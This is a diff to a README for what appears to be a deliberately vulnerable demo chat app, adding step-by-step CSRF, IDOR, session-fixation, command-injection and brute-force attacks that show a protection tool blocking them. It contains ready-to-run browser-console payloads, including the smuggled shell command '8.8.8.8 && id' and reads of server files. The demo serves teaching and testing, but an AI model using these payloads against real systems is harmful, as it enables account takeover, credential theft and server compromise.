@@ -151,6 +151,67 @@ https://nexachat.onrender.com
 
 **Pro tip**: Run it twice with ShieldWatch ON — second run is blocked from the very first request!
 
+### Attack 6 — CSRF (profile hijack)
+1. Log into NexaChat as **alice**
+2. In the SAME browser, open a new tab and go to:
+   ```
+   https://nexachat-aj89.onrender.com/csrf-attack.html
+   ```
+3. Click **"Claim My Reward"** button
+4. **Without ShieldWatch**: Alice's bio changes to "HACKED via CSRF" — silently!
+5. **With ShieldWatch**: BLOCKED — dashboard shows CSRF verdict
+
+### Attack 7 — IDOR (reads any user's password)
+1. In browser console:
+   ```javascript
+   fetch('/api/user/1').then(r=>r.json()).then(d=>console.log(d.user))
+   ```
+2. Returns admin's full database record — **including plain-text password**
+3. Try other IDs: `/api/user/2`, `/api/user/3`, etc.
+4. **With ShieldWatch**: BLOCKED — IDOR pattern detected
+
+### Attack 8 — Session Fixation (account takeover)
+1. In browser console (Tab 1 — attacker):
+   ```javascript
+   // Step 1: See the victim's session ID
+   fetch('/api/session/id').then(r=>r.json()).then(console.log)
+   ```
+2. Copy the `sessionId` from the response
+3. In browser console (Tab 2 — attacker pretending to be alice):
+   ```javascript
+   // Step 2: Set cookies to victim's session ID
+   document.cookie = 'connect.sid=PASTE_SESSION_ID_HERE; path=/'
+   // Step 3: Now access any authenticated endpoint AS alice
+   fetch('/api/me').then(r=>r.json()).then(console.log)
+   ```
+4. You're now logged in as alice without her password!
+5. **With ShieldWatch**: BLOCKED on `/api/session/id` access
+
+### Attack 9 — Command Injection (OS commands on server)
+1. In browser console (must be logged in):
+   ```javascript
+   fetch('/api/tools/ping', {
+     method: 'POST',
+     headers: {'Content-Type': 'application/json'},
+     body: JSON.stringify({ host: '8.8.8.8 && id' })
+   }).then(r=>r.json()).then(d=>console.log(d.output))
+   ```
+2. Without ShieldWatch: Server runs `id` — shows server's user/uid
+3. Try: `8.8.8.8 && ls /` → lists server root directory
+4. Try: `8.8.8.8 && cat /etc/hostname` → reveals server hostname
+5. **With ShieldWatch**: cmdInjection patterns detected → BLOCKED
+
+### Attack 10 — Brute Force (password cracking)
+1. Open Terminal and run:
+   ```bash
+   cd ~/Desktop/NexaChat
+   node brute-force.js
+   ```
+2. Tries 30 common passwords against admin account (150ms between attempts)
+3. **Without ShieldWatch**: Tries until `admin123` found → prints ✅ SUCCESS
+4. **With ShieldWatch**: Blocked after 5 failures → prints 🛡️ BLOCKED
+5. Dashboard shows BRUTE FORCE verdict with failure count
+
 ---
 
 ## What the Dashboard Shows
